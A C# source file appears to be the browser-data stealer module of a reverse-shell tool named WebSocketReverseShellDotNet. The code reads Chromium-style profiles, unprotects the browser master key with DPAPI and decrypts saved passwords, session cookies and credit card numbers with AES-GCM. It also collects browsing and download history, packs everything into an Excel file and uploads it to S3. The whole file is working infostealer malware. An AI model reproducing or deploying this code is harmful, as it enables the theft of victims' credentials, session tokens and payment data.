using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using WebSocketReverseShellDotNet.utils;
using System.Security.Cryptography;
using System.Data.SQLite;
using WebSocketReverseShellDotNet.model.broswer;
using System.Runtime.CompilerServices;
using Microsoft.VisualStudio.TestPlatform.CrossPlatEngine;
using Constants = WebSocketReverseShellDotNet.utils.Constants;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Crypto.Engines;


namespace WebSocketReverseShellDotNet.service.commands
{
    internal class BrowserExfelterator : Command
    {


        Dictionary<string, List<object>> browserData = new Dictionary<string, List<object>>();

        String historyKey = "HISTORY";
        List<object> history = new List<object>();


        String downloadHistoryKey = "DOWNLOAD HISTORY";
        List<object> downloadHistory = new List<object>();

        String loginKey = "LOGIN";
        List<object> login = new List<object>();

        String cookiesKey = "Cookies";
        List<object> cookies = new List<object>();
        
        String creditCardsKey = "Credit Cards";
        List<object> creditCards = new List<object>();

        

        public string ExecuteCommand(string command)
        {

            /*StringBuilder stringBuilder = new StringBuilder();*/
            try 
            {
                foreach (String browserHome in Constants.LIST_OF_BROWSER_LOCATIONS)
                {
                    if (!OSUtil.DirectoryExists(browserHome)) continue;
                    byte[] encryptionKey = getEncryptionKey(browserHome);

                    processProfile(browserHome, encryptionKey);
                }
                if (history.Count != 0)
                {
                    browserData.Add(historyKey, history);
                }
                if (downloadHistory.Count != 0)
                {
                    browserData.Add(downloadHistoryKey, downloadHistory);
                }

                if (login.Count != 0)
                {
                    browserData.Add(loginKey, login);
                }
                if (cookies.Count != 0)
                {
                    browserData.Add(cookiesKey, cookies);
                }

                if (creditCards.Count != 0)
                {
                    browserData.Add(creditCardsKey, creditCards);
                }
                string path = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}\\browser.xlsx";
                FileInfo file = Excel.ConvertToExcel(browserData, path);
                return S3Uploadutil.UploadToS3(file);
            } catch (Exception ex)
            {
                return ex.Message;
            }
            
        }

        private byte[]  getEncryptionKey(String browserHome)
        {

            try {
                string localStateFileLocation = browserHome + Constants.ENCRYPTION_KEY_BROWSER_DB;
                string localStateFileLocationExpandedPath = Environment.ExpandEnvironmentVariables(localStateFileLocation);

                if (!OSUtil.FileExists(localStateFileLocation)) return [];


                string jsonContent = File.ReadAllText(localStateFileLocationExpandedPath);

                // Deserialize the JSON content into a dynamic object
 /*               dynamic? localState = JsonSerializer.Deserialize<dynamic>(jsonContent);*/

  
                JsonDocument jsonDocument = JsonDocument.Parse(jsonContent);

                // Assuming you are checking a property named "os_crypt"
                JsonElement osCryptElement;
                if (jsonDocument.RootElement.TryGetProperty("os_crypt", out osCryptElement))
                {
                    // Assuming "os_crypt" is an object with a property "encrypted_key"
                    JsonElement encryptedKeyElement;
                    if (osCryptElement.TryGetProperty("encrypted_key", out encryptedKeyElement))
                    {
                        // Decode the base64-encoded key
                        byte[] masterKeyBytes = Convert.FromBase64String(
                            encryptedKeyElement.GetString());

                        // Trim the first 5 bytes from the decoded key
                        byte[] trimmedKey = new byte[masterKeyBytes.Length - 5];
                        Array.Copy(masterKeyBytes, 5, trimmedKey, 0, trimmedKey.Length);

                        // Decrypt the key using ProtectedData
                        byte[] decryptedKeyBytes = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.LocalMachine);

                        // Convert the decrypted key to a string if needed
                        string decryptedKeyString = Encoding.UTF8.GetString(decryptedKeyBytes);

                        /*Console.WriteLine($"decryptedKeyString: {decryptedKeyString}");*/

                        return decryptedKeyBytes;


                    }
                    else
                    {
                        /*Console.WriteLine("The 'encrypted_key' property does not exist in the 'os_crypt' object.");*/
                    }
                }
                else
                {
                    /*Console.WriteLine("The 'os_crypt' property does not exist in the JSON document.");*/
                }

            }
            catch (Exception e)
            {
                /*Console.WriteLine(e.Message);*/
                return [];

            }
            

            return [];
        }
  
        static string SubstringFromIndex(string input, int startIndex)
        {
            // Check if the startIndex is within the valid range
            if (startIndex >= 0 && startIndex < input.Length)
            {
                return input.Substring(startIndex);
            }
            else
            {
                // Handle invalid startIndex (out of range)
                /*Console.WriteLine("Invalid startIndex");*/
                return null;
            }
        }




            private void processProfile(String browserHome, byte[] encryptionKey)
        {
            foreach (string browserProfile in Constants.LIST_OF_PROFILE_LOCATIONS)
            {
                String profilePath = browserHome + browserProfile;

                if (!OSUtil.DirectoryExists(profilePath)) continue;
                exfilterateUserData(profilePath, encryptionKey);

            }
        }

        private void exfilterateUserData(String profilePath, byte[] encryptionKey)
        {
            String profileDir = Environment.ExpandEnvironmentVariables(profilePath);
            String historyDb = profileDir + Constants.HISTORY_BROWSER_DB;
            string folderPath = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}";
            Directory.CreateDirectory(folderPath);
            historyDb = OSUtil.CopyFileWithNumberPreAppended(historyDb, folderPath , 1);

           


            if (!String.IsNullOrEmpty(historyDb))
            {
                string connectionString = $"Data Source={historyDb};Version=3;";
                try
                {
                    ProcessWebHistoryData(connectionString, profileDir);
                }
                catch (Exception e) {
                    /*Console.WriteLine(e.Message);*/
                }
               
            }

            
            String loginDb = profileDir + Constants.LOGIN_DATA_BROWSER_DB;
            loginDb = OSUtil.CopyFileWithNumberPreAppended(loginDb, folderPath, 1);
            if (!String.IsNullOrEmpty(loginDb))
            {
                string connectionString = $"Data Source={loginDb};Version=3;";
                try
                {
                    ProcessLoginData(connectionString, profileDir, encryptionKey);
                }
                catch (Exception e)
                {
                    /*Console.WriteLine(e.Message);*/
                }
            }

            String cookies = profileDir + Constants.COOKIES_BROWSER_DB;
            cookies = OSUtil.CopyFileWithNumberPreAppended(cookies, folderPath, 1);
            if (!String.IsNullOrEmpty(cookies))
            {
                string connectionString = $"Data Source={cookies};Version=3;";
                try
                {
                    ProcessCookiesData(connectionString, profileDir, encryptionKey);
                }
                catch (Exception e)
                {
                  /*  Console.WriteLine(e.Message);*/
                }
            }

            String creditCards = profileDir + Constants.COOKIES_BROWSER_DB;
            creditCards = OSUtil.CopyFileWithNumberPreAppended(creditCards, folderPath, 1);
            if (!String.IsNullOrEmpty(creditCards))
            {
                string connectionString = $"Data Source={creditCards};Version=3;";
                try
                {
                    ProcessCreditCardsData(connectionString, profileDir, encryptionKey);
                }
                catch (Exception e)
                {
                   /* Console.WriteLine(e.Message);*/
                }
            }

        }

        void ProcessCreditCardsData(string connectionString, String profileDir, byte[] encryptionKey)
        {
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                connection.Open();
                // get web history
                using (SQLiteCommand command = new SQLiteCommand(
                    "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted,datetime(date_modified/1e6-11644473600,'unixepoch','localtime') as date_modified ,origin  FROM credit_cards;", connection))
                {
                    using (SQLiteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string cardName = reader["name_on_card"].ToString();
                            string expirationMonth = reader["expiration_month"].ToString();
                            string expirationYear = reader["expiration_year"].ToString();
                            string dateModified = reader["date_modified"].ToString();
                            string origin = reader["origin"].ToString();


                            byte[] encrypted_value = reader["card_number_encrypted"] as byte[];
                            string decryptedCard = DecryptPassword(encrypted_value, encryptionKey);


                            CreditCardModel cookieModel =
                                new CreditCardModel(cardName,expirationMonth,origin,decryptedCard,dateModified,expirationYear, profileDir);
                            creditCards.Add(cookieModel);



                        }
                    }
                }
            }
        }

        void ProcessCookiesData(string connectionString, String profileDir, byte[] encryptionKey)
        {
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                connection.Open();
                // get web history
                using (SQLiteCommand command = new SQLiteCommand(
                    "SELECT host_key, name, encrypted_value, path, is_secure,is_httponly,datetime(creation_utc/1e6-11644473600,'unixepoch','localtime') as creation_utc,datetime(expires_utc/1e6-11644473600,'unixepoch','localtime') as expires_utc,datetime(last_access_utc/1e6-11644473600,'unixepoch','localtime') as last_access_utc, datetime(last_update_utc/1e6-11644473600,'unixepoch','localtime') as last_update_utc FROM cookies", connection))
                {
                    using (SQLiteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string hostKey = reader["host_key"].ToString();
                            string name = reader["name"].ToString();
                            string path = reader["path"].ToString();
                            string isSecure = reader["is_secure"].ToString();
                            string isHttponly = reader["is_httponly"].ToString();
                            string creation_utc = reader["creation_utc"].ToString();
                            string expires_utc = reader["expires_utc"].ToString();
                            string last_access_utc = reader["last_access_utc"].ToString();
                            string last_update_utc = reader["last_update_utc"].ToString();

                            byte[] encrypted_value = reader["encrypted_value"] as byte[];
                            string decryptedCookie = DecryptPassword(encrypted_value, encryptionKey);


                            CookieModel cookieModel = 
                                new CookieModel(hostKey,name,creation_utc,path,isSecure,isHttponly,
                                last_access_utc,last_update_utc,expires_utc,decryptedCookie, profileDir);
                            cookies.Add(cookieModel);



                        }
                    }
                }
            }
        }

        void ProcessLoginData(string connectionString, String profileDir, byte[] encryptionKey)
        {
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                connection.Open();
                // get web history
                using (SQLiteCommand command = new SQLiteCommand(
                    "SELECT origin_url,action_url,username_value,password_value,datetime(date_created/1e6-11644473600,'unixepoch','localtime') as date_created,datetime(date_last_used/1e6-11644473600,'unixepoch','localtime') as date_last_used FROM logins;", connection))
                {
                    using (SQLiteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string originUrl = reader["origin_url"].ToString();
                            string actionUrl = reader["action_url"].ToString();
                            string username = reader["username_value"].ToString();
                            byte[] passwordEncrypted = reader["password_value"] as byte[];

                            string dateCreated = reader["date_created"].ToString();
                            string dateLastUsed = reader["date_last_used"].ToString();

                            string password = DecryptPassword(passwordEncrypted, encryptionKey);
                            LoginModel loginModel = new LoginModel(username, password, originUrl,
                                actionUrl, dateCreated, dateLastUsed, profileDir);
                            login.Add(loginModel);



                        }
                    }
                }
            }
        }


        void ProcessWebHistoryData(string connectionString, String profileDir)
        {
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                connection.Open();
                try
                {

                    // get web history
                    using (SQLiteCommand command = new SQLiteCommand(
                        "SELECT url, title, datetime(last_visit_time/1e6-11644473600,'unixepoch','localtime') as time FROM urls order by time desc", connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = reader["url"].ToString();
                                string title = reader["title"].ToString();
                                string visitTime = reader["time"].ToString();

                                // Check if any of the fields is null or empty
                                if (string.IsNullOrEmpty(url) && string.IsNullOrEmpty(title) && string.IsNullOrEmpty(visitTime))
                                {
                                    continue;
                                }

                                HistoryModel historyModel = new HistoryModel(url, title, visitTime, profileDir);
                                history.Add(historyModel);
                                // Process the valid data
                                //Console.WriteLine($"URL: {url}, Title: {title}, Last Visit Time: {visitTime}");
                            }
                        }
                    }


                }
                catch (Exception e) 
                {
                   /* Console.WriteLine(e.Message);*/
                
                 }
                try {

                    // get download history
                    using (SQLiteCommand command = new SQLiteCommand(
           "SELECT tab_url, target_path, mime_type, datetime(start_time/1e6-11644473600,'unixepoch','localtime') as start_time , datetime(end_time/1e6-11644473600,'unixepoch','localtime') as end_time FROM downloads order by start_time desc", connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string downloadUrl = reader["tab_url"].ToString();
                                string downloadPath = reader["target_path"].ToString();
                                string downloadType = reader["mime_type"].ToString();
                                string startTime = reader["start_time"].ToString();
                                string endTime = reader["end_time"].ToString();


                                // Check if any of the fields is null or empty
                                if (string.IsNullOrEmpty(downloadUrl) && string.IsNullOrEmpty(downloadPath) && string.IsNullOrEmpty(downloadType) && string.IsNullOrEmpty(startTime) && string.IsNullOrEmpty(endTime))
                                {
                                    continue;
                                }

                                DownloadHistory historyModel = new DownloadHistory(downloadUrl, downloadPath, downloadType, startTime, endTime, profileDir);
                                downloadHistory.Add(historyModel);

                            }
                        }
                    }

                } 
                catch (Exception e)
                {
                    /*Console.WriteLine(e.Message);*/
                }



            }
        }


        public string DecryptPassword(byte[] buff, byte[] master_key)
        {
            byte[] iv = buff.Skip(3).Take(12).ToArray();
            byte[] payload = buff.Skip(15).ToArray();
            GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
            AeadParameters parameters = new AeadParameters(new KeyParameter(master_key), 128, iv, null);
            cipher.Init(false, parameters);
            byte[] decrypted_pass = new byte[cipher.GetOutputSize(payload.Length)];
            int byteCount = cipher.ProcessBytes(payload, 0, payload.Length, decrypted_pass, 0);
            cipher.DoFinal(decrypted_pass, byteCount);
            return Encoding.UTF8.GetString(decrypted_pass);
        }
 

    }
}
